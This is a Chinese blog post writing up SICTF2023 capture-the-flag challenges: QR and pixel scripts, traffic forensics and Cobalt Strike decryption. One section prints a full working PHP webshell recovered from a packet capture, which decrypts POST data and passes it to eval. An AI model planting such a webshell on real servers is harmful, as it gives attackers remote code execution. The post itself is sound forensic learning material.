

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Zer0peach">
  <meta name="keywords" content="">
  
    <meta name="description" content="SICTF2023就记录一些不会的题 MISCbaby_zip明文攻击+lsb隐写（010打开就行） echo -n &quot;89504e470d0a1a0a0000000d49484452&quot; |xxd -r -ps &gt; key.txt    我的当时思路： 压缩包有密码，尝试伪加密，破解后显示crc错误，自己构造一个带图片的压缩包，对比发现原压缩包图片内容没有文件头部分，然后">
<meta property="og:type" content="article">
<meta property="og:title" content="sictf2023">
<meta property="og:url" content="https://zer0peach.github.io/2023/09/10/sictf2023/index.html">
<meta property="og:site_name" content="Zer0peach can&#39;t think">
<meta property="og:description" content="SICTF2023就记录一些不会的题 MISCbaby_zip明文攻击+lsb隐写（010打开就行） echo -n &quot;89504e470d0a1a0a0000000d49484452&quot; |xxd -r -ps &gt; key.txt    我的当时思路： 压缩包有密码，尝试伪加密，破解后显示crc错误，自己构造一个带图片的压缩包，对比发现原压缩包图片内容没有文件头部分，然后">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910160932339.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910161008575.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910182126677.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910182455111.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910182605633.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910182736580.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910202300228.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910202637906.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910202825317.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910202851419.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910210453746.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910211920890.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910212103449.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910212926345.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910212949221.png">
<meta property="og:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910214204467.png">
<meta property="og:image" content="https://zer0peach.github.io/image-20230911153225651.png">
<meta property="article:published_time" content="2023-09-10T08:02:54.000Z">
<meta property="article:modified_time" content="2023-10-23T07:16:19.693Z">
<meta property="article:author" content="Zer0peach">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://zer0peach.github.io/2023/09/10/sictf2023/image-20230910160932339.png">
  
  
  
  <title>sictf2023 - Zer0peach can&#39;t think</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"zer0peach.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 6.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Zer0peach&#39;s Blog</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                <span>友链</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="sictf2023"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2023-09-10 16:02" pubdate>
          2023年9月10日 下午
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          12k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          102 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">sictf2023</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="SICTF2023"><a href="#SICTF2023" class="headerlink" title="SICTF2023"></a>SICTF2023</h1><p>就记录一些不会的题</p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="baby-zip"><a href="#baby-zip" class="headerlink" title="baby_zip"></a>baby_zip</h3><p>明文攻击+lsb隐写（010打开就行）</p>
<div class="code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">echo</span> -n <span class="hljs-string">&quot;89504e470d0a1a0a0000000d49484452&quot;</span> |xxd -r -<span class="hljs-keyword">ps</span> &gt; key.txt</code></pre></div>

<p><img src="/2023/09/10/sictf2023/image-20230910160932339.png" srcset="/img/loading.gif" lazyload alt="image-20230910160932339"></p>
<p><img src="/2023/09/10/sictf2023/image-20230910161008575.png" srcset="/img/loading.gif" lazyload alt="image-20230910161008575"></p>
<p>我的当时思路：</p>
<p>压缩包有密码，尝试伪加密，破解后显示crc错误，自己构造一个带图片的压缩包，对比发现原压缩包图片内容没有文件头部分，然后就尝试自己加，但是宽高不知道，crc写不了，最终也没有办法了</p>
<h3 id="QR-QR-QR"><a href="#QR-QR-QR" class="headerlink" title="QR_QR_QR"></a>QR_QR_QR</h3><p>这个当时没时间写了,结束后也想自己尝试下，但还是失败了（才知道是python的问题，不是我的。。。。。）</p>
<p>自己的想法：</p>
<p>很明显01转二维码（第一次在不知道wp的情况下写脚本），成功后以为每次都一样，但是多次尝试后发现是不一样的，然后就像提示说的使用pwntool，还挺简单的，接着关键一步就是识别二维码的脚本，网上发现无非就是两种(pyzbar库和cv2库)，但我使用都出了问题</p>
<p>看了眼wp，基本是一样的，但是因为pyzbar库报错不能成功，服了。。。。</p>
<div class="code-wrapper"><pre><code class="hljs elm"><span class="hljs-title">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-title">from</span> <span class="hljs-type">PIL</span> <span class="hljs-keyword">import</span> Image
<span class="hljs-title">from</span> pyzbar.pyzbar <span class="hljs-keyword">import</span> decode

<span class="hljs-title">img</span> = <span class="hljs-type">Image</span>.new(<span class="hljs-string">&quot;RGB&quot;</span>,(<span class="hljs-number">115</span>,<span class="hljs-number">115</span>))
<span class="hljs-title">p</span> = remote(<span class="hljs-string">&quot;host&quot;</span>,<span class="hljs-keyword">port</span>)
for i in range(115):
    a = p.recvline().strip().decode()
    for j in range(115):
        if(a[j]==&#x27;0&#x27;):
            img.putpixel((i,j),(255,255,255))
        else:
            img.putpixel((i,j),(0,0,0))
p.sendline(decode(img)[0][0])</code></pre></div>

<p>应该能成功，失败的话自己网上找一下识别二维码的代码去替换一下</p>
<p>看了WP说还要解1000次才出flag。。。。。。</p>
<p>别人的完整WP</p>
<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> cv2
<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
<span class="hljs-keyword">from</span> pyzbar.pyzbar <span class="hljs-keyword">import</span> decode

r=remote(<span class="hljs-string">&quot;host&quot;</span>,port)
count = <span class="hljs-number">0</span>
<span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):
    count += <span class="hljs-number">1</span>
    <span class="hljs-built_in">print</span>(count)
    data = <span class="hljs-built_in">list</span>(r.recvuntil(<span class="hljs-string">b&quot;P&quot;</span>)[:-<span class="hljs-number">1</span>])

    <span class="hljs-comment"># 定义图像的宽度和高度（根据数据长度调整）</span>
    width = <span class="hljs-number">116</span>
    height = <span class="hljs-number">116</span>

    <span class="hljs-comment"># 创建一个空白图像</span>
    image = Image.new(<span class="hljs-string">&quot;1&quot;</span>, (width, height), color=<span class="hljs-number">1</span>)  <span class="hljs-comment"># 1表示单色（黑白）</span>

    <span class="hljs-comment"># 获取图像的像素访问对象</span>
    pixels = image.load()

    <span class="hljs-comment"># 将01数据填充到图像中</span>
    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):
        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(width):
            index = y * width + x
            <span class="hljs-keyword">if</span> index &lt; <span class="hljs-built_in">len</span>(data) <span class="hljs-keyword">and</span> data[index] == <span class="hljs-number">48</span>:
                pixels[x, y] = <span class="hljs-number">0</span>  <span class="hljs-comment"># 将0写为黑色像素点</span>
            <span class="hljs-keyword">else</span>:
                pixels[x, y] = <span class="hljs-number">1</span>  <span class="hljs-comment"># 将0写为黑色像素点</span>

    <span class="hljs-comment"># 保存图像为文件</span>
    image.save(<span class="hljs-string">&quot;1.png&quot;</span>)
    decocdeQR = decode(Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;1.png&quot;</span>))[<span class="hljs-number">0</span>].data
    r.sendline(decocdeQR)
    temp = r.recvline()
    <span class="hljs-built_in">print</span>(temp)
    temp = r.recvline()
    <span class="hljs-built_in">print</span>(temp)</code></pre></div>



<h3 id="Pixel-art"><a href="#Pixel-art" class="headerlink" title="Pixel_art"></a>Pixel_art</h3><p>赛后讨论说是提取像素脚本然后解密OOK</p>
<p>但即使知道思路，还是不知道怎么做，等着看WP吧</p>
<p>压缩包伪加密得到图片，stegsolve查看lsb隐写，发现图片（就只做到这里）</p>
<p>大小仅有20*20，不难想到flag被加密进了像素点里。写一个脚本提取像素点：</p>
<div class="code-wrapper"><pre><code class="hljs maxima">from PIL import Image
img = Image.open(&#x27;&#x27;)
<span class="hljs-built_in">width</span>,<span class="hljs-built_in">height</span> = img.size
pix = []

<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">width</span>):
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">height</span>):
        pix.<span class="hljs-built_in">append</span>(img.getpixel(i,j))
<span class="hljs-built_in">print</span>(pix)</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs scheme">[(<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">46</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">63</span>, <span class="hljs-number">46</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">46</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">33</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">63</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">63</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">33</span>, <span class="hljs-number">33</span>, <span class="hljs-number">63</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">33</span>), ......, (<span class="hljs-name">46</span>, <span class="hljs-number">46</span>, <span class="hljs-number">33</span>), (<span class="hljs-name">46</span>, <span class="hljs-number">63</span>, <span class="hljs-number">46</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>), (<span class="hljs-name">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)]</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs cos">对应<span class="hljs-keyword">ASCII</span>码
<span class="hljs-number">46</span>-. 
<span class="hljs-number">33</span>-!
<span class="hljs-number">63</span>-?</code></pre></div>

<p>然后联想到Ook</p>
<div class="code-wrapper"><pre><code class="hljs maxima">from PIL import Image

<span class="hljs-built_in">image</span> = Image.open(&#x27;&#x27;)  # 替换为隐写出来的图片
<span class="hljs-built_in">width</span>, <span class="hljs-built_in">height</span> = <span class="hljs-built_in">image</span>.size
pixel_data = []

<span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">height</span>):
    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">width</span>):
        pixel = <span class="hljs-built_in">image</span>.getpixel((x, y))
        pixel_data.<span class="hljs-built_in">append</span>(pixel)

count = <span class="hljs-number">0</span>
<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(len(pixel_data)):
    <span class="hljs-keyword">if</span>(pixel_data[i] == (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)):
        <span class="hljs-built_in">break</span>
    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> pixel_data[i]:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Ook&quot;</span>+chr(j),end = <span class="hljs-string">&quot;&quot;</span>)</code></pre></div>



<h3 id="Easy-Shark"><a href="#Easy-Shark" class="headerlink" title="Easy_Shark"></a>Easy_Shark</h3><p>自己的思路：提取http对象，发现上传的shell.php的内容，以及上传的一些数据</p>
<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;2295d22e2d70888f&quot;</span>;
	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;
	<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);
	<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))
	&#123;
		<span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;
		<span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);
		
		<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;
    			 <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; 
    			&#125;
	&#125;
	<span class="hljs-keyword">else</span>
	&#123;
		<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);
	&#125;
    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);
    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];
    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];
	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;
    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);
<span class="hljs-meta">?&gt;</span>
</code></pre></div>

<p>想着是上传的内容然后对应解密，但还是没思路，应该还是没看懂这段代码的原因</p>
<p>WP的思路差不多，对数据进行对应解密（我当时少了一层base64，只拿去AES解密导致什么都看不出来）</p>
<p>拿到加密方式后，可以看出，在openssl扩展有效时，这段代码对数据的解密方式为AES_128后base64，并且给了key的值(之后了解到这是很明显的<strong>冰蝎</strong>的特征)。那么就可以使用cyberchef，对之后的每个tcp流里的base64数据进行恢复：</p>
<p><img src="/2023/09/10/sictf2023/image-20230910182126677.png" srcset="/img/loading.gif" lazyload alt="image-20230910182126677"></p>
<p>圈起来的地方注意一下，iv自行补0直到出现内容即可</p>
<p>然后把里面的信息解密出来看看</p>
<p><img src="/2023/09/10/sictf2023/image-20230910182455111.png" srcset="/img/loading.gif" lazyload alt="image-20230910182455111"></p>
<p>tcp流有很多，大佬们贴出来的图是</p>
<p><img src="/2023/09/10/sictf2023/image-20230910182605633.png" srcset="/img/loading.gif" lazyload alt="image-20230910182605633"></p>
<p>由此去解密响应信息（响应数据太多了，复现找不到两个文本的内容）</p>
<p><img src="/2023/09/10/sictf2023/image-20230910182736580.png" srcset="/img/loading.gif" lazyload alt="image-20230910182736580"></p>
<p>GronKey.txt：</p>
<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>,<span class="hljs-number">50</span>,<span class="hljs-number">61</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">63</span>,<span class="hljs-number">41</span></code></pre></div>

<p>flag.txt：</p>
<div class="code-wrapper"><pre><code class="hljs ebnf"><span class="hljs-attribute">TGLBOMSJNSRAJAZDEZXGHSJNZWHG</span></code></pre></div>

<p>根据GronKey找到Gronsfeld加密</p>
<p>（类似于凯撒这样的移位密码，每个字符根据对应数字进行移位，若密钥长度小于字符串，就从头再次开始）</p>
<div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">from</span>  Crypto.Util.number <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">from</span> pycipher <span class="hljs-keyword">import</span> Gronsfeld

t = [<span class="hljs-number">1</span>,<span class="hljs-number">50</span>,<span class="hljs-number">61</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">20</span>,<span class="hljs-number">63</span>,<span class="hljs-number">41</span>]
<span class="hljs-keyword">temp</span> = &quot;TGLBOMSJNSRAJAZDEZXGHSJNZWHG&quot;
print (Gronsfeld(t).decipher(<span class="hljs-keyword">temp</span>))</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs dust"><span class="language-xml">SICTF</span><span class="hljs-template-variable">&#123;SHUMUISAGOODBOYYYYYYYYY&#125;</span></code></pre></div>

<h3 id="一起上号不"><a href="#一起上号不" class="headerlink" title="一起上号不"></a>一起上号不</h3><p>有关cs的流量分析，应该去找类似的题目的，但当时并不怎么想做，大佬们也是参照别的文章的解题顺序做的</p>
<p>导出http对象，获得一个key.zip，利用工具解密cobalstrike公钥和私钥</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Slzdude/cs-scripts">Slzdude&#x2F;cs-scripts: 研究CobaltStrike时的一些副产品 (github.com)</a></p>
<p>因为虚拟机坏了，只能先拿<code>unknown</code>师傅的图了</p>
<p><img src="/2023/09/10/sictf2023/image-20230910202300228.png" srcset="/img/loading.gif" lazyload alt="image-20230910202300228"></p>
<p>有了私钥，拿去解<code>/load</code>路由中cookie中的元数据，拿到AES_KEY，HMAC_KEY</p>
<p><a target="_blank" rel="noopener" href="https://github.com/WBGlIl/CS_Decrypt">WBGlIl&#x2F;CS_Decrypt (github.com)</a></p>
<p><img src="/2023/09/10/sictf2023/image-20230910202637906.png" srcset="/img/loading.gif" lazyload alt="image-20230910202637906"></p>
<p>然后找到<code>/submit.php</code>下发送的POST请求内容</p>
<p>先hex解密再base64加密</p>
<p><img src="/2023/09/10/sictf2023/image-20230910202825317.png" srcset="/img/loading.gif" lazyload alt="image-20230910202825317"></p>
<p><img src="/2023/09/10/sictf2023/image-20230910202851419.png" srcset="/img/loading.gif" lazyload alt="image-20230910202851419"></p>
<p>总结下顺序：</p>
<ol>
<li>解密key文件，得到<code>private-key</code></li>
<li>拿到cookie中的元数据，解密出<code>AES_KEY</code>，<code>HMAC_KEY</code></li>
<li>找到<code>/submit.php</code>的数据，先hex解密再base64加密，然后跑脚本</li>
</ol>
<h3 id="还不上号-（easy-shark和一起上号的组合）"><a href="#还不上号-（easy-shark和一起上号的组合）" class="headerlink" title="还不上号 （easy_shark和一起上号的组合）"></a>还不上号 （easy_shark和一起上号的组合）</h3><p>两个流量包</p>
<p>内容高度一致，就说一下不同点吧</p>
<p>包一对比<code>easy_shark</code>缺少<code>key</code>（但我自己找不到<code>shell.php</code>的内容）</p>
<p>而包二中导出<strong>http</strong>对象有<code>key.zip</code></p>
<p>压缩包有加密，也没法进行明文攻击，那么就ziprello爆破，爆破得到密码<code>we1l</code></p>
<p>发现零宽字符隐写，解密时要点上这两个</p>
<p><img src="/2023/09/10/sictf2023/image-20230910210453746.png" srcset="/img/loading.gif" lazyload alt="image-20230910210453746"></p>
<div class="code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span>52f1488563bf0e</code></pre></div>

<p>然后按照easy_shark的方式解密</p>
<p>得到两个文件</p>
<p>flag.txt：</p>
<div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">SICTF</span>&#123;<span class="hljs-number">79</span>e1755e-<span class="hljs-number">08</span>a8-<span class="hljs-number">4</span>d</code></pre></div>

<p>key：<img src="/2023/09/10/sictf2023/image-20230910211920890.png" srcset="/img/loading.gif" lazyload alt="image-20230910211920890"></p>
<p>剩下的和<code>一起上号不</code>一样</p>
<p>最后得到了个base32</p>
<p><img src="/2023/09/10/sictf2023/image-20230910212103449.png" srcset="/img/loading.gif" lazyload alt="image-20230910212103449"></p>
<p>解密即可</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="include（签到）"><a href="#include（签到）" class="headerlink" title="include（签到）"></a>include（签到）</h3><p>很简单filter伪协议就可以</p>
<p>这里我尝试包含pearcmd.php （我虽然知道这种解法，但每次看到<code>include</code>都想不起来可以用这个）</p>
<p><img src="/2023/09/10/sictf2023/image-20230910212926345.png" srcset="/img/loading.gif" lazyload alt="image-20230910212926345"></p>
<p><img src="/2023/09/10/sictf2023/image-20230910212949221.png" srcset="/img/loading.gif" lazyload alt="image-20230910212949221"></p>
